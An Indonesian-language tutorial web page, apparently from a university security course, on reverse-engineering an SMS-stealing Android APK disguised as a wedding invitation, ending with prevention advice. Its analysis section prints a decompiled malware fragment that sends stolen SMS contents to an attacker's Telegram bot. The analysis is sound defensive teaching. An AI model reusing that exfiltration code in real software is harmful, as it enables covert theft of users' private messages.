@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Analisis Malware APK (Studi Kasus: SMS Stealer)</title>
+    <link rel="stylesheet" href="docstyle.css"> 
+</head>
+<body>
+
+    <header class="site-header">
+        <div class="container">
+            <h1><a href="index.html">Keamanan Jaringan</a></h1>
+            <nav class="nav-kanan">
+                <ul>
+                    <li><a href="index.html">Beranda</a></li>
+                    <li><a href="index.html">Kontak</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container doc-content-wrapper">
+        
+        <aside class="doc-sidebar">
+            <nav class="toc">
+                <h2>Daftar Isi</h2>
+                <ul>
+                    <li><a href="#pendahuluan">1. Pendahuluan</a></li>
+                    <li><a href="#langkahA">2. Langkah 1: Setup Alat</a></li>
+                    <li><a href="#langkahB">3. Langkah 2: Dekompilasi Awal (Apktool)</a></li>
+                    <li><a href="#langkahC">4. Langkah 3: Ekstraksi Kode DEX</a></li>
+                    <li><a href="#langkahD">5. Langkah 4: Dekompilasi Kode Java</a></li>
+                    <li><a href="#langkahE">6. Langkah 5: Analisis Kode</a></li>
+                    <li><a href="#mitigasi">7. Kesimpulan & Mitigasi</a></li>
+                </ul>
+            </nav>
+        </aside>
+
+        <main class="doc-main-content">
+
+            <section id="pendahuluan" class="doc-section">
+                <h2>1. Pendahuluan</h2>
+                <p>Tutorial ini memandu proses analisis dasar (reverse engineering) pada sebuah file APK Android yang mencurigakan, seperti file dengan nama 'UndanganPernikahan.apk'. Jenis file ini sering digunakan dalam serangan social engineering untuk menyebarkan malware.</p>
+                <p>Tujuan kita adalah untuk membongkar aplikasi dan menganalisis kodenya untuk menemukan perilaku berbahaya, seperti pencurian data (dalam kasus ini, SMS).</p>
+                <p>Langkah pertama yang baik adalah selalu memeriksa hash file untuk identifikasi:</p>
+                <div class="code-block"><code>sudo su
+sha256sum UndanganPernikahan.apk</code></div>
+            </section>
+
+            <section id="langkahA" class="doc-section">
+                <h2>2. Langkah 1: Setup Alat</h2>
+                <p>Kita akan menggunakan Apktool, sebuah alat populer untuk rekayasa balik aplikasi Android. Unduh file .jar dan buat agar dapat dieksekusi.</p>
+                <div class="code-block"><code># Unduh Apktool
+wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.3.jar -O apktool.jar
+
+# Beri izin eksekusi
+chmod +x apktool.jar</code></div>
+            </section>
+
+            <section id="langkahB" class="doc-section">
+                <h2>3. Langkah 2: Dekompilasi Awal (Apktool)</h2>
+                <p>Gunakan Apktool untuk mendekompilasi file APK. Perintah ini akan mengekstrak file sumber daya (resource) seperti layout, gambar, dan yang terpenting, <code>AndroidManifest.xml</code>.</p>
+                <div class="code-block"><code>java -jar apktool.jar d --no-res UndanganPernikahan.apk -o UndanganPernikahan_decompiled -f</code></div>
+                <p>Setelah ini, Anda dapat memeriksa file <code>AndroidManifest.xml</code> di dalam folder <code>UndanganPernikahan_decompiled</code> untuk melihat izin (permission) apa saja yang diminta aplikasi. Izin yang mencurigakan misalnya <code>READ_SMS</code>, <code>SEND_SMS</code>, atau <code>READ_CONTACTS</code>.</p>
+            </section>
+
+            <section id="langkahC" class="doc-section">
+                <h2>4. Langkah 3: Ekstraksi Kode DEX</h2>
+                <p>Kode aplikasi inti (logika program) berada di dalam file <code>classes.dex</code> (bisa lebih dari satu, misal classes2.dex, classes3.dex). Kita dapat mengekstrak file-file ini menggunakan perintah <code>unzip</code>.</p>
+                <div class="code-block"><code># Buat direktori baru untuk file dex
+mkdir dex_files
+
+# Ekstrak hanya file .dex dari APK
+unzip UndanganPernikahan.apk 'classes*.dex' -d dex_files
+
+cd dex_files
+ls -l</code></div>
+            </section>
+
+            <section id="langkahD" class="doc-section">
+                <h2>5. Langkah 4: Dekompilasi Kode Java</h2>
+                <p>File DEX adalah bytecode Dalvik, bukan kode Java yang bisa dibaca manusia. Untuk membacanya, kita perlu decompiler. Ada banyak pilihan, seperti JADX (offline) atau layanan online (seperti decompiler.com).</p>
+                <p>Prosesnya adalah:</p>
+                <ol>
+                    <li>Buka situs decompiler.</li>
+                    <li>Unggah salah satu file DEX yang mencurigakan (misalnya <code>classes3.dex</code>).</li>
+                    <li>Decompiler akan memproses file tersebut dan menyediakannya sebagai kode Java yang dapat dibaca.</li>
+                    <li>Unduh hasilnya (biasanya dalam format zip) dan ekstrak.</li>
+                </ol>
+            </section>
+            
+            <section id="langkahE" class="doc-section">
+                <h2>6. Langkah 5: Analisis Kode</h2>
+                <p>Setelah mengekstrak hasil dekompilasi, kita dapat menelusuri struktur folder kode. Dalam contoh ini, analisis pada file <code>sources/com/example/myapplicatior/SendSMS.java</code> menemukan sebuah fragmen kode yang sangat mencurigakan.</p>
+                <p>Kode tersebut menunjukkan fungsi untuk mengirim data menggunakan OkHttpClient ke API Telegram:</p>
+                <div class="code-block"><code>this.client.newCall(
+    new Request.Builder().url(
+        "https://api.telegram.org/bot[TOKEN_BOT_RAHASIA]/sendMessage?parse_mode=markdown&chat_id=[CHAT_ID_PENYERANG]&text=Berhasil Kirim SMS dari Jauh %0AKepada : _"
+        + str5 + ",%0A𝗣𝗲𝘀𝗮𝗻 : " + str9 + "_"
+    ).build()
+).enqueue(new Callback() {
+    // ...
+});</code></div>
+                
+                <h3>Analisis Kode:</h3>
+                <ul>
+                    <li>Fungsi ini membuat panggilan HTTP (HTTP request).</li>
+                    <li>URL target adalah <code>api.telegram.org</code>, yang merupakan API resmi Telegram.</li>
+                    <li>URL tersebut berisi Token Bot (<code>bot[TOKEN_BOT_RAHASIA]</code>) dan Chat ID (<code>chat_id=[CHAT_ID_PENYERANG]</code>) yang di-hardcode.</li>
+                    <li>Bagian <code>text=</code> dari URL adalah pesan yang akan dikirim ke chat Telegram penyerang.</li>
+                    <li>Pesan ini berisi variabel <code>str5</code> (kemungkinan besar nomor pengirim/penerima SMS) dan <code>str9</code> (kemungkinan besar isi dari SMS tersebut).</li>
+                </ul>
+                <p>Ini adalah bukti kuat bahwa aplikasi tersebut adalah malware yang dirancang untuk mencuri SMS dan mengirimkannya ke penyerang melalui Telegram.</p>
+            </section>
+
+            <section id="mitigasi" class="doc-section">
+                <h2>7. Kesimpulan & Mitigasi</h2>
+                <p>Analisis ini mengkonfirmasi bahwa APK 'Undangan Pernikahan' adalah aplikasi berbahaya yang mencuri data pribadi (SMS).</p>
+                <h3>Cara Mencegah Serangan Semacam Ini:</h3>
+                <ul>
+                    <li>Jangan pernah menginstal aplikasi (file .apk) dari sumber yang tidak dikenal atau tidak dipercaya (di luar Google Play Store).</li>
+                    <li>Selalu periksa izin (permission) yang diminta oleh aplikasi saat instalasi. Aplikasi undangan pernikahan tidak seharusnya memerlukan izin untuk membaca SMS Anda.</li>
+                    <li>Gunakan perangkat lunak antivirus yang tepercaya di perangkat seluler Anda.</li>
+                    <li>Jika Anda curiga telah menginstal malware, segera putuskan koneksi internet, pindai perangkat, dan ganti semua kata sandi penting Anda.</li>
+                </ul>
+            </section>
+
+        </main>
+    </div>
+
+    <footer class="doc-footer">
+            <div class="container">
+                <div class="footer-logo">
+                    <img src="Foto/Logo-Universitas-Atma-Jaya-Yogyakarta-Dianisa.com_.png" alt="Logo UAJY" />
+                    <p>Dokumentasi Tutorial. Diperbarui: 13 Oktober 2025.</p>
+                </div>
+            </div>
+    </footer>
+
+</body>
+</html>
